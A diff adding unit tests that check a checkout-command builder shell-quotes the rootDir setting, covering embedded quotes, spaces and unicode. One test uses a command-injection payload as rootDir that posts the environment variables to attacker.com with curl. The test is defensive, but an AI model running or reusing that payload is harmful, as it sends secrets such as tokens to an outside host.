@@ -1847,6 +1847,52 @@ describe('index', function () {
             });
         });
 
+        it('escapes embedded single quotes in rootDir', () => {
+            config.rootDir = "foo'bar";
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(command.command, "cd 'foo'\\''bar'");
+                assert.include(command.command, "mkdir -p 'foo'\\''bar'");
+            });
+        });
+
+        it('neutralizes a command-injection payload in rootDir', () => {
+            config.rootDir = ';curl -s -X POST https://attacker.com -d "$(env)"';
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(
+                    command.command,
+                    `mkdir -p '${config.rootDir}'`,
+                    'the payload must land entirely inside a single-quoted mkdir argument'
+                );
+                assert.include(
+                    command.command,
+                    `cd '${config.rootDir}'`,
+                    'the payload must land entirely inside a single-quoted cd argument'
+                );
+
+                const withoutQuotedPayload = command.command
+                    .split(`mkdir -p '${config.rootDir}'`)
+                    .join('')
+                    .split(`cd '${config.rootDir}'`)
+                    .join('');
+
+                assert.notMatch(
+                    withoutQuotedPayload,
+                    /curl/,
+                    'the payload must not appear anywhere outside the quoted mkdir/cd arguments'
+                );
+            });
+        });
+
+        it('preserves rootDir values with spaces and unicode', () => {
+            config.rootDir = 'path/to/日本語 dir';
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(command.command, "cd 'path/to/日本語 dir'");
+            });
+        });
+
         it('promises to get the checkout command for a child pipeline', () => {
             config.parentConfig = {
                 branch: 'master',
